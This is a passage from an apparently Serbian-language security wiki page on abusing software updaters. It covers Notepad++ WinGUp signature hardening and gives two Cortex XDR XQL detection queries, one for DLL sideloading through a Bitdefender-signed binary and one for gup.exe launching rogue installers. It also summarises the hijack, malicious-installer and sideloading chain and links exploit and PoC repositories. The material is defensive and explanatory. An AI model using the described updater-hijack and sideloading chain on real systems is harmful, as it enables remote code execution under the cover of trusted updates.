- Notepad++ je ojačao WinGUp u verziji v8.8.9 i novijim: vraćeni XML je sada potpisan (XMLDSig), a novije verzije zahtevaju proveru sertifikata i potpisa preuzetog instalacionog programa umesto da se oslanjaju samo na transport.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideload-ovanje potpisanog Bitdefender EXE-a `log.dll` (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> pokreće instalacioni program koji nije Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Ovi obrasci važe za svaki updater koji prihvata nepotpisane manifeste ili ne proverava potpisnike instalacionih programa — otmica mreže + zlonamerni instalacioni program + sideloading sa sopstvenim potpisom omogućavaju udaljeno izvršavanje koda pod izgovorom „pouzdanih“ ažuriranja.

---
## References
- [1] [Savet – Netskope Client for Windows – Lokalna eskalacija privilegija putem lažnog servera (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Bezbednosno saopštenje kompanije Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – dodatak za Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC klijent/eksploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre i Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Lokalna eskalacija privilegija putem upisivih datoteka u Checkmk Agent-u](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Eskalacija privilegija u Windows agentu](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoC-ovi](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Napadi državnih aktera na lanac snabdevanja Notepad++-a](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – obaveštenje o incidentu sa otetom infrastrukturom](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Zaobilaženje ispravke za CVE-2025-0309 u Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Otkrivanje grešaka u eskalaciji privilegija u Lenovo Vantage-u](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
